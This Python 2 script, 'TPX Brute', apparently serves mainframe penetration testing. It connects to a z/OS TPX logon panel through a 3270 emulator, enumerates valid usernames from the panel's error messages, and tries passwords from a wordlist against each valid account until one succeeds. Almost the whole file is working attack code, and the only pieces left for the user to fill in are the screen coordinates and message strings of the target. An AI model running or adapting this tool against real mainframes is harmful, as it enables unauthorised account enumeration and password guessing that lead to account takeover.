#!/usr/bin/python
# -*- coding: utf-8 -*-

from py3270 import EmulatorBase
from termcolor import colored
import time, platform, sys, argparse, re

############################################################################
#  ADPAPT SECTION: TO MODIFY FOR YOUR TARGET
############################################################################
#Need to modify these 4 following messages because messages returned by TPX can be specified by Z/OS administrators
INVALID_USERNAME = "NOT AUTHORIZED MESSAGE" #Message when the username is invalid
VALID_USERNAME = "PASSWORD NOT GIVEN MESSAGE" #Message when the username is valid
INVALID_PASSWORD = "INVALID PASSWORD MESSAGE" #Message when the password is invalid for a valid user
VALID_PASSWORD = "VALID CREDENTIALS MESSAGE" #Message when the password is valid for a specific user
#Parameters: You have to modify for your TPX env
FIELD_X_TPX_VERSION = ? # X Position of the TPX version
FIELD_Y_TPX_VERSION = ? # X Position of the TPX version
FIELD_LENGTH_TPX_VERSION = ? # Length of the TPX version
FIELD_X_USERNAME = ? #X Position of the username field on the TPX interface
FIELD_Y_USERNAME = ? #Y Position of the username flied on the TPX interface
FIELD_X_PASSWORD = ? #X Position of the pasword field on the TPX interface
FIELD_Y_PASSWORD = ? #Y Position of the pasword field on the TPX interface
FIELD_X_MESSAGE = ? #X Position of the message returned on the TPX interface
FIELD_Y_MESSAGE = ? #Y Position of the message returned on the TPX interface
############################################################################

#The location of the x3270 and s3270 programs
if platform.system() == 'Linux':
	class Emulator(EmulatorBase):
		x3270_executable = '/usr/bin/x3270'
		s3270_executable = '/usr/bin/s3270'
else:
	print '[!] Your Platform:', platform.system(), 'is not supported at this time.'
	sys.exit()

def Connect_to_ZOS():
	#connects to the target machine and sleeps for 'sleep' seconds
	em.connect(results.target)
	time.sleep(results.sleep)

#start argument parser
parser = argparse.ArgumentParser(description='TPX Brute - The z/OS TPX logon panel brute forcer.',epilog='')
parser.add_argument('-t','--target', help='target IP address and port: TARGET[:PORT] default port is 23', required=True,dest='target')
parser.add_argument('-s','--sleep',help='Seconds to sleep between actions (increase on slower systems). The default is 1 second.',default=1,type=int,dest='sleep')
parser.add_argument('-u','--userfile',help='File containing list of usernames', required=True,dest='userfile')
parser.add_argument('-p','--passfile',help='File containing list of passwords',dest='passfile')
parser.add_argument('-m','--moviemode',help='Enables Movie Mode. Watch in real time TPX view',default=False,dest='movie_mode',action='store_true')
parser.add_argument('-e','--enumerate',help='Enables Enumeration Mode Only. Default is brute force mode',default=False,dest='enumeration',action='store_true')
parser.add_argument('-q','--quiet',help='Only display found users / found passwords',default=False,dest='quiet',action='store_true')
args = parser.parse_args()



valid_users = []
valid_creds = []
print '[+] TPX Brute - The z/OS TPX logon panel enumerator/brute forcer.'
results = parser.parse_args() # put the arg results in the variable results
print '[+] Target              =', results.target
print '[+] Username File       =', results.userfile
userfile=open(results.userfile) #open the usernames file
if not results.enumeration: print '[+] Password Listing    =', results.passfile
print '[+] Wait (Sds)          =', results.sleep
print '[+] Attack platform     =', platform.system() 

if not results.passfile and not results.enumeration: #A password file is required if we're not in enumeration mode
	sys.exit("[!] Enumeration mode only is not enabled (-e). Password file (-p) is required! Aborting.")

if results.movie_mode:
        if not results.quiet: print '[+] Movie Mode          = ENABLED'
	em = Emulator(visible=True)
else:
	if not results.quiet: print '[+] Movie Mode          = DISABLED'
	em = Emulator()
if results.quiet: print '[+] Quiet Mode ENABLED'
print '[+] Connecting to',results.target,"... (can take some time)"
connect = Connect_to_ZOS()
if not em.is_connected():
	print '[-] Could not connect to ', results.target, '. Aborting!'
	sys.exit()
print '[+] Getting to Logon Panel...'
#make sure we're actually at the TPX logon screen
tpxVersion = em.string_get(FIELD_X_TPX_VERSION, FIELD_Y_TPX_VERSION, FIELD_LENGTH_TPX_VERSION)
if "TPX" in tpxVersion:
	print "[+] TPX detected. Version: {0}".format(tpxVersion)
	print "[+] Testing each username stored in {0}".format(results.userfile)
	for username in userfile:
		print "[+] Testing with username {0}".format(username.strip())
		if username[0].isdigit():
			if not results.quiet: print ' |-', username.strip() ,'-- [!] Usernames cannot start with a number, skipping'
		elif not re.match("^[a-zA-Z0-9#@$]+$", username):
			if not results.quiet: print ' |-', username.strip() ,'-- [!] Username contains an invalid character (Only A-z, 0-9, #, $ and @), skipping'
		elif len(username.strip()) > 7: #TSO only allows a username of 7 characters so don't bother trying it
			if not results.quiet: print ' |-', username.strip() ,'-- [!] User name too long ( >7 )'
		else:
			valid_username = False
			time.sleep(results.sleep)
			em.fill_field(FIELD_X_USERNAME, FIELD_Y_USERNAME, username.strip(), 7)
			em.send_enter()
			if em.string_found(FIELD_X_MESSAGE,FIELD_Y_MESSAGE,INVALID_USERNAME):
				print colored(' |- Username: '+username.strip()+' invalid', 'red')
			elif em.string_found(FIELD_X_MESSAGE,FIELD_Y_MESSAGE,VALID_USERNAME):
				print colored(' |- Username: '+username.strip()+' VALID', 'green')
				valid_username = True
				valid_users.append(username.strip())
			else:
				print ' |- Username:', username.strip(), 'ERROR unknown, you should modify'
			em.exec_command('PrintText(html,tso_screen.html)')
			if valid_username == True:
				if not results.enumeration:
					print '[++] Starting Brute Forcer for {0}'.format(username.strip())
					passfile=open(results.passfile)
					for password in passfile:
						valid_password = False
						if not  re.match("^[a-zA-Z0-9#@$]+$", password):
							if not results.quiet: print '[--]', password.strip(),'-- [!] Password contains an invalid character (Only A-z, 0-9, #, $ and @)'
						elif len(password.strip()) > 8:
							if not results.quiet: print '[--]', password.strip(),'-- [!] Password too long ( >8 )'
						else:
							time.sleep(results.sleep)
							em.fill_field(FIELD_X_PASSWORD, FIELD_Y_PASSWORD, password.strip(), len(password.strip()))
							em.send_enter()
							em.exec_command('PrintText(html,tso_screen.html)')
							if em.string_found(FIELD_X_MESSAGE,FIELD_Y_MESSAGE,INVALID_PASSWORD):
								print colored('  |- Password: '+password.strip()+' Password is NOT valid for'+username.strip(), 'red')
							elif em.string_found(FIELD_X_MESSAGE,FIELD_Y_MESSAGE,VALID_PASSWORD):
								print colored('  |- Password: '+password.strip()+' Password is valid for '+username.strip(), 'green')
								valid_password = True
								valid_creds.append([username.strip(), password.strip()])
							else:
								print '  |- Password:', password.strip() ,'ERROR unknown, you should modify'
							if valid_password == True:
								break
					passfile.close()
	userfile.close()

if results.enumeration:
	print '[+] Found', len(valid_users), 'valid user accounts:'
	for enum_user in valid_users:
		print ' |- Valid User ID ->', enum_user

# Close the connection
em.terminate()
